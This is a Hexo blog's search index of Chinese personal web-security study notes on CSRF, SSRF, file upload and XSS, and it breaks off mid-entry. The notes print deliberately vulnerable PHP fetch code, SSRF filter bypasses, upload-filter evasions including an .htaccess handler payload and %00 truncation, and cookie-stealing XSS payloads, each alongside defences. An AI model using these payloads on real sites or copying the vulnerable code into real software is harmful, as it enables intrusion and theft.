<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>代码演示</title>
      <link href="/2022/10/07/%E4%BB%A3%E7%A0%81%E5%9D%97%E6%BC%94%E7%A4%BA/%E6%BC%94%E7%A4%BA/"/>
      <url>/2022/10/07/%E4%BB%A3%E7%A0%81%E5%9D%97%E6%BC%94%E7%A4%BA/%E6%BC%94%E7%A4%BA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>‘’’<br>file_get_content<br><?phpif (isset($_POST['url'])) { $content = file_get_contents($_POST['url']); $filename ='./images/'.rand().';img1.jpg’; file_put_contents($filename, $content); echo $_POST['url’]; $img = "<img src=\"".$filename."\"/>"; } echo $img; ?></p><p>fsockopen<br>&lt;?php</p><p>function GetFile($host, $port, $link)<br>{<br>    &#x2F;&#x2F;fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用<br>    &#x2F;&#x2F;（例如： fgets() ， fgetss() ，<br>    &#x2F;&#x2F; fwrite() ， fclose() 还有 feof() ）。如果调用失败，将返回 FALSE 。<br>    $fp &#x3D; fsockopen($host, intval($port), $errno, $errstr, 30);<br>    if (!$fp) {<br>        echo “$errstr (error number $errno) \n”;<br>    } else {<br>        $out &#x3D; “GET $link HTTP&#x2F;1.1\r\n”;<br>        $out .&#x3D; “Host: $host\r\n”;<br>        $out .&#x3D; “Connection: Close\r\n\r\n”;<br>        $out .&#x3D; “\r\n”;<br>        fwrite($fp, $out);<br>        $contents &#x3D; ‘’;<br>        while (! feof($fp)) {<br>            $contents .&#x3D; fgets($fp, 1024);<br>        }<br>        fclose($fp);<br>        return $contents;<br>    }<br>}<br>$host &#x3D; $_GET[‘host’];<br>$port &#x3D; $_GET[‘port’];<br>$link &#x3D; $_GET[‘link’];</p><p>curl_exec<br><?php if (isset($_POST['url'])){$link = $_POST['url’];$curlobj = curl_init();curl_setopt($curlobj, CURLOPT_POST, 0);curl_setopt($curlobj,CURLOPT_URL,$link);curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($curlobj);curl_close($curlobj);$filename = './curled/'.rand().'.txt’;file_put_contents($filename, $result); echo $result;}?></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2022/08/12/hello-world/"/>
      <url>/2022/08/12/hello-world/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CSRF-个人笔记</title>
      <link href="/2020/01/07/CSRF/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2020/01/07/CSRF/CSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="CSRF-1"><a href="#CSRF-1" class="headerlink" title="CSRF"></a>CSRF</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">挟制用户在当前已登录的Web应用程序上执行非本意的操作,即攻击者盗用了你的某个网站身份,以你的名义发送恶意请求</span><br><span class="line">发邮件,发信息,财产操作,转账或者购买商品等</span><br></pre></td></tr></table></figure><h3 id="CSRF流程"><a href="#CSRF流程" class="headerlink" title="CSRF流程"></a>CSRF流程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">用户在浏览器上登录了信任的网站A,并在浏览器中保存了相应cookie,再不退出网站A的情况下访问了恶意网站B,恶意网站B伪造用户身份,进行恶意操作</span><br></pre></td></tr></table></figure><h3 id="CSRF—GET-x2F-POST"><a href="#CSRF—GET-x2F-POST" class="headerlink" title="CSRF—GET&#x2F;POST"></a>CSRF—GET&#x2F;POST</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">把请求操作改为POST请求并不能防止CSRF:</span><br><span class="line">1.服务器端在请求时候未严格区分GET和POST请求,攻击者依然可以用GET请求表单提交地址</span><br><span class="line">2.使用了$_REQUEST请求,其既可以接收GET请求也可以接收POST请求</span><br><span class="line">3.在攻击界面构造form表单,用js自动提交表单</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="CSRF挖掘"><a href="#CSRF挖掘" class="headerlink" title="CSRF挖掘"></a>CSRF挖掘</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">冒充身份:订阅/关注/转发/投票</span><br><span class="line">账户接管:密码修改,邮箱绑定,第三方关联</span><br><span class="line">其他:登录/注册/注销</span><br></pre></td></tr></table></figure><h3 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.关键操作增加验证码</span><br><span class="line">2.验证referer</span><br><span class="line">3.使用token</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CSRF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF-个人笔记</title>
      <link href="/2020/01/07/SSRF/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
      <url>/2020/01/07/SSRF/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF-1"><a href="#SSRF-1" class="headerlink" title="SSRF"></a>SSRF</h2><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">攻击者构造形成由服务端发送请求的一个安全漏洞,一般情况下,SSRF攻击的目标是从外网无法访问的内部系统.</span><br></pre></td></tr></table></figure><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">web应用提供了从其他服务器获取数据的功能,例如使用用户指定的url,web应用获取图片,下载文件,读取文件内容等.这个功能被恶意使用,可以利用存在缺陷的web应用作为代理攻击远程和本地服务器.服务器提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制.</span><br></pre></td></tr></table></figure><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.可以对外网服务器所在的内网,本地进行端口扫描,获取服务banner信息 (可以获取到软件开发商、软件名称、服务类型、版本号)</span><br><span class="line">2.攻击运行在内网或者本地的应用程序</span><br><span class="line">3.通过访问默认文件实现,对内网web应用进行指纹识别</span><br><span class="line">4.攻击内外网的web应用,sql注入,struct2,redis等</span><br><span class="line">5.利用file协议读取本地文件等</span><br></pre></td></tr></table></figure><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file_get_content</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) &#123; </span><br><span class="line">$content = file_get_contents($_POST[&#x27;url&#x27;]); </span><br><span class="line">$filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg’;</span><br><span class="line"> file_put_contents($filename, $content); </span><br><span class="line">echo $_POST[&#x27;url’]; </span><br><span class="line">$img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">echo $img; </span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">fsockopen</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function GetFile($host, $port, $link)</span><br><span class="line">&#123;</span><br><span class="line">    //fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用</span><br><span class="line">    //（例如： fgets() ， fgetss() ，</span><br><span class="line">    // fwrite() ， fclose() 还有 feof() ）。如果调用失败，将返回 FALSE 。</span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);</span><br><span class="line">    if (!$fp) &#123;</span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $out = &quot;GET $link HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out .= &quot;Host: $host\r\n&quot;;</span><br><span class="line">        $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">        $out .= &quot;\r\n&quot;;</span><br><span class="line">        fwrite($fp, $out);</span><br><span class="line">        $contents = &#x27;&#x27;;</span><br><span class="line">        while (! feof($fp)) &#123;</span><br><span class="line">            $contents .= fgets($fp, 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line">        return $contents;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$host = $_GET[&#x27;host&#x27;];</span><br><span class="line">$port = $_GET[&#x27;port&#x27;];</span><br><span class="line">$link = $_GET[&#x27;link&#x27;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl_exec</span><br><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;]))&#123;</span><br><span class="line">$link = $_POST[&#x27;url’];</span><br><span class="line">$curlobj = curl_init();</span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($curlobj);curl_close($curlobj);</span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt’;</span><br><span class="line">file_put_contents($filename, $result);</span><br><span class="line"> echo $result;&#125;?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="SSRF漏洞挖掘"><a href="#SSRF漏洞挖掘" class="headerlink" title="SSRF漏洞挖掘"></a>SSRF漏洞挖掘</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.web功能查找--&gt;访问页面观察页面加载的东西例如图片,是否是我们浏览器去请求的</span><br><span class="line">2.url地址分享网页内容</span><br><span class="line">3.转码服务--&gt;通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</span><br><span class="line">4.在线翻译--&gt;通过 URL地址翻译对应文本的内容。提供此功能的百度、有道等</span><br><span class="line">5.图片加载与下载：通过 URL地址加载或下载图片</span><br></pre></td></tr></table></figure><h4 id="SSRF验证"><a href="#SSRF验证" class="headerlink" title="SSRF验证:"></a>SSRF验证:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.抓包--&gt;SSRF是服务端发起的请求,在加载图片是时,本地浏览器不应该存在该图片的请求</span><br><span class="line">2.验证此URL是否可以来请求对应的内网地址。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。内网地址可以通过从漏洞平台中的历史漏洞寻找泄露的内网地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="SSRF绕过"><a href="#SSRF绕过" class="headerlink" title="SSRF绕过"></a>SSRF绕过</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.限制为http://www.xxx.com 域名</span><br><span class="line">采用http基本身份认证的方式绕过。即@</span><br><span class="line">http://www.xxx.com@www.xxc.com</span><br><span class="line">@：</span><br><span class="line">http://www.baidu.com@10.10.10.10与http://10.10.10.10 请求是相同的</span><br><span class="line"></span><br><span class="line">。:</span><br><span class="line">http://127.0.0.1与http://127 。 0 。 0 。 1 ,中文句号绕过,两个请求是相同的</span><br><span class="line"></span><br><span class="line">2.限制请求IP不为内网地址,当不允许ip为内网地址时</span><br><span class="line">（1）采取短网址绕过</span><br><span class="line">  短网址绕过:</span><br><span class="line">http://tool.chinaz.com/tools/dwz.aspx?qq-pf-to=pcqq.group</span><br><span class="line"></span><br><span class="line">（2）采取特殊域名</span><br><span class="line"> Xip.io</span><br><span class="line">127.0.0.1.xip.io  --&gt;127.0.0.1</span><br><span class="line">www.127.0.0.1.xip.io   --&gt;127.0.0.1</span><br><span class="line">Haha.127.0.0.1.xip.io  --&gt;127.0.0.1</span><br><span class="line">Haha.xixi.127.0.0.1.xip.io  --&gt;127.0.0.1</span><br><span class="line">（3）采取进制转换</span><br><span class="line"> IP地址转换成十进制：</span><br><span class="line"> 127.0.0.1=2130706433  16进制也是可行的</span><br><span class="line"> http://www.ab126.com/system/2859.html</span><br><span class="line"></span><br><span class="line">3.限制请求只为http协议</span><br><span class="line">（1）采取302跳转</span><br><span class="line">（2）采取短地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="SSRF防御"><a href="#SSRF防御" class="headerlink" title="SSRF防御"></a>SSRF防御</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态</span><br><span class="line">2.限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等 </span><br><span class="line">3.黑名单内网IP</span><br><span class="line">4.禁用不需要的协议，仅仅允许HTTP和HTTPS.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>文件上传-个人笔记</title>
      <link href="/2020/01/07/UPLOAD/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/07/UPLOAD/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="WEB-文件上传"><a href="#WEB-文件上传" class="headerlink" title="WEB-文件上传"></a>WEB-文件上传</h1><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="轻量级的检测绕过攻击"><a href="#轻量级的检测绕过攻击" class="headerlink" title="轻量级的检测绕过攻击"></a>轻量级的检测绕过攻击</h3><p>绕过javascript对后缀的检测</p><p>绕过服务端对http request包的MIME类型的检测</p><p>绕过文件内容幻数头的检测 </p><h3 id="路径-x2F-扩展名检测绕过"><a href="#路径-x2F-扩展名检测绕过" class="headerlink" title="路径&#x2F;扩展名检测绕过"></a>路径&#x2F;扩展名检测绕过</h3><h4 id="判断上传方式"><a href="#判断上传方式" class="headerlink" title="判断上传方式"></a>判断上传方式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">判断黑白名单上传 ----&gt;&gt;改为不存在的后缀判断回显结果,成功的上传即是黑名单,反之白名单</span><br></pre></td></tr></table></figure><h4 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h4><h5 id="特殊文件名"><a href="#特殊文件名" class="headerlink" title="特殊文件名"></a>特殊文件名</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(基于windows系统特性) </span><br><span class="line">. . . . (点空格点)    ::$DATA  大小写(Php pHp)    </span><br><span class="line">windows对大小写不敏感以及默认自动会去除文件名后有空格和点的文件后缀</span><br><span class="line">(基于代码层面)  </span><br><span class="line">双写(phphpp)  特殊文件名绕过(php2) </span><br></pre></td></tr></table></figure><h5 id="黑名单列表绕过"><a href="#黑名单列表绕过" class="headerlink" title="黑名单列表绕过"></a>黑名单列表绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">上传黑名单外的可被解析的后缀(.cer)</span><br></pre></td></tr></table></figure><h5 id="00绕过"><a href="#00绕过" class="headerlink" title="%00绕过"></a>%00绕过</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%00  php版本5.3以下  </span><br><span class="line">上传路径可控时,在路径后加目标文件,接着用%00截断</span><br><span class="line">如: ./upload/33.php%00</span><br></pre></td></tr></table></figure><h5 id="htaccess-文件攻击"><a href="#htaccess-文件攻击" class="headerlink" title=".htaccess 文件攻击"></a>.htaccess 文件攻击</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">作为局部变量作用文件成功的前提条件: </span><br><span class="line">(httpd.exe)开启:</span><br><span class="line">1.Allow Override All</span><br><span class="line">2.LoadModule rewrite_module modules/mod_rewrite.so</span><br><span class="line"></span><br><span class="line">.htaccess---&gt;haha.png   </span><br><span class="line">上传.htaccess文件的内容,内容里定义后头上传的文件,可被解析成相应文件.</span><br><span class="line">(&lt;FilesMatch &quot;haha&quot;&gt;           </span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt; /FilesMatch&gt;)</span><br></pre></td></tr></table></figure><h5 id="多文件上传–条件竞争"><a href="#多文件上传–条件竞争" class="headerlink" title="多文件上传–条件竞争"></a>多文件上传–条件竞争</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">原因:服务器允许先上传,之后再对不合格的文件检测和修改.</span><br><span class="line">只要新建文件的速度比删除的的速度快就可以成功上传目标文件.</span><br><span class="line">操作:</span><br><span class="line">1.上传的文件包含如下代码(file_put_contents(&#x27;shell.php&#x27;,&#x27;&lt;?php phpinfo(); ?&gt;&#x27;);)---&gt;&gt;新建一个内容为&#x27;&lt;?php phpinfo(); ?&gt;&#x27;的shsll.php文件.</span><br><span class="line">2.抓上传文件的包和访问文件的包进行爆破 </span><br></pre></td></tr></table></figure><h5 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apache解析漏洞</span><br><span class="line">IIS解析漏洞</span><br><span class="line">Nginx解析漏洞</span><br></pre></td></tr></table></figure><h4 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h4><h5 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%00  php版本5.3以下  </span><br><span class="line">上传路径可控时,在路径后加目标文件,接着用%00截断</span><br><span class="line">如: ./upload/33.php%00</span><br></pre></td></tr></table></figure><h5 id="PHP文件包含漏洞"><a href="#PHP文件包含漏洞" class="headerlink" title="PHP文件包含漏洞"></a>PHP文件包含漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP中引发文件包含漏洞的通常是以下四个函数：</span><br><span class="line">1、include()当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。</span><br><span class="line">2、include_once()功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。</span><br><span class="line">3、require()只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息，并且终止脚本的运行</span><br><span class="line">4、require_once()它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次</span><br></pre></td></tr></table></figure><h5 id="解析漏洞-1"><a href="#解析漏洞-1" class="headerlink" title="解析漏洞:"></a>解析漏洞:</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS解析漏洞</span><br><span class="line">Nginx解析漏洞</span><br></pre></td></tr></table></figure><h5 id="Put协议上传"><a href="#Put协议上传" class="headerlink" title="Put协议上传"></a>Put协议上传</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器开启put方法，我们不需要任何的代码支持，直接就可以上传文件</span><br></pre></td></tr></table></figure><h4 id="中间件解析漏洞详解"><a href="#中间件解析漏洞详解" class="headerlink" title="中间件解析漏洞详解"></a>中间件解析漏洞详解</h4><h5 id="Apache未知拓展名解析漏洞"><a href="#Apache未知拓展名解析漏洞" class="headerlink" title="Apache未知拓展名解析漏洞"></a>Apache未知拓展名解析漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件名test.php.aaa.bbb.ccc----&gt;&gt;Apache从后往前依次读取能解析的拓展名</span><br><span class="line">test.php.xxxx----&gt;&gt;test.php</span><br></pre></td></tr></table></figure><h5 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS6</span><br><span class="line">目录解析漏洞  test.asp/1.jpg  </span><br><span class="line">目录后缀以: .asp .asa .cer .cdx 结尾,其目录下的所有文件都会当成.asp后缀的文件</span><br><span class="line"></span><br><span class="line">文件名解析漏洞   xxx.asp;.jpg</span><br><span class="line">文件名后缀中有: .asp;   .asa;   .cer;   .cdx; 优先按asp来解析</span><br></pre></td></tr></table></figure><h4 id="Nginx解析漏洞-IIS-7-0-x2F-IIS7-5-Nginx-lt-8-0-3"><a href="#Nginx解析漏洞-IIS-7-0-x2F-IIS7-5-Nginx-lt-8-0-3" class="headerlink" title="Nginx解析漏洞(IIS 7.0 &#x2F; IIS7.5  Nginx&lt;8.0.3)"></a>Nginx解析漏洞(IIS 7.0 &#x2F; IIS7.5  Nginx&lt;8.0.3)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1./任意文件名.php解析漏洞 </span><br><span class="line">对于任意文件名，在后面添加/xxx.php（xxx为任意字符）后,即可将文件作为php解析</span><br><span class="line">原文件名test.jpg----&gt;&gt;test.jpg/x.php</span><br><span class="line">2.低版本Ngin--&gt;&gt;%00.php解析攻击</span><br><span class="line">(windows)上传一个waf白名单内的1.jpg扩展名文件----&gt;1.jpg%00.php进行进行请求</span><br><span class="line">(linux)  上传一个waf白名单内的1.jpg扩展名文件----&gt;1.jpg%20%00.php进行进行请求</span><br></pre></td></tr></table></figure><h3 id="预防"><a href="#预防" class="headerlink" title="预防"></a>预防</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.将上传文件目录的所有用户的执行权限取消</span><br><span class="line">2.随机数改写文件名路径名,增加攻击者攻击成本</span><br><span class="line">3.服务端文件名内容扩展检测</span><br><span class="line">文件幻数检测(jpg(JFIF) gif(GIF89a) png(%PNG))</span><br><span class="line">文件相关信息检测(文件头加一些图片信息中间夹杂攻击代码)</span><br><span class="line">文件加载检测(调用API或者函数进行文件加载测试  php的gd库)</span><br><span class="line">4.单独设置文件服务器,设置执行权限可读可写不可执行</span><br><span class="line">5.二次渲染,将上传的图片重新保存为一个图片,将里面的可执行代码删除</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 文件上传 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSS-个人笔记</title>
      <link href="/2020/01/07/XSS/XSS--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/01/07/XSS/XSS--%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h2 id="XSS-1"><a href="#XSS-1" class="headerlink" title="XSS"></a>XSS</h2><p>跨站脚本攻击</p><h4 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对用户提交的数据不过滤或者过滤不严谨,拼接然后执行了用户输入的恶意JS代码.</span><br></pre></td></tr></table></figure><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">盗取用户或者管理员cookie,电子邮件钓鱼,网站挂马,网页键盘记录,获取浏览器的明文密码等</span><br></pre></td></tr></table></figure><h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">评论区,留言板,搜索框,订单信息等</span><br></pre></td></tr></table></figure><h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(同域名|IP、同端口、同协议)</span><br><span class="line">保护a.com域名下的资源不被来自其他网页的脚本读取或者篡改.</span><br></pre></td></tr></table></figure><h4 id="常用标签"><a href="#常用标签" class="headerlink" title="常用标签"></a>常用标签</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;-----   &lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br><span class="line">&lt;input&gt; -----   &lt;input onfocus=&quot;alert(document.cookie)&quot;&gt;</span><br><span class="line">&lt;details&gt;-----&lt;details ontoggle=&quot;alert(document.cookie)&quot;&gt;</span><br><span class="line">&lt;svg&gt;------&lt;svg onload=&#x27;alert(&quot;xss&quot;)&#x27;&gt;</span><br><span class="line">&lt;img&gt;  ------    &lt;img src=&quot;x&quot; onerror=alert(document.cookie)&gt;</span><br><span class="line">&lt;select&gt; ----- &lt;select onfocus=alert(document.cookie)autofocus&gt;</span><br><span class="line">&lt;iframe&gt; -----   &lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;link&gt; -------   &lt;link rel=&quot;stylesheet&quot; href=&quot;x&quot; onerror=alert(document.cookie)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="闭合"><a href="#闭合" class="headerlink" title="闭合"></a>闭合</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">源码:&lt;input name=&quot;user&quot; type=&quot;text&quot;  value=&lt;?php  echo @$_GET[&#x27;text&#x27;];?&gt; &gt;</span><br><span class="line">闭合:?text=&gt;&lt;script&gt;alert`1`&lt;/script&gt;&lt;</span><br><span class="line">源码:&lt;textarea&gt;&lt;?php  echo @$_GET[&#x27;text&#x27;];?&gt;&lt;/textarea&gt;</span><br><span class="line">闭合:闭合: &lt;/textarea&gt; &lt;script&gt;alert`1`&lt;/script&gt; &lt;textarea&gt;</span><br><span class="line">源码:function domxss()&#123;</span><br><span class="line">       var str = document.getElementById(&quot;text&quot;).value;</span><br><span class="line">       document.getElementById(&quot;dom&quot;).innerHTML = &quot;&lt;a href=&#x27;&quot;+str+&quot;&#x27;&gt;what do you see?&lt;/a&gt;&quot;;</span><br><span class="line">       &#125;</span><br><span class="line">     闭合: &#x27;&gt;&lt;img src=&quot;#&quot; onmouseover=&quot;alert(&#x27;xss&#x27;)&quot;&gt;</span><br><span class="line">          &#x27; onclick=&quot;alert(&#x27;xss&#x27;)&quot;</span><br></pre></td></tr></table></figure><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h4 id="反射型XSS-非持续型"><a href="#反射型XSS-非持续型" class="headerlink" title="反射型XSS(非持续型)"></a>反射型XSS(非持续型)</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">XSS代码通过url参数或者请求发送给服务器,服务器处理完接收参数将其返回给响应的html,浏览器解析执行了该XSS代码.</span><br><span class="line"></span><br><span 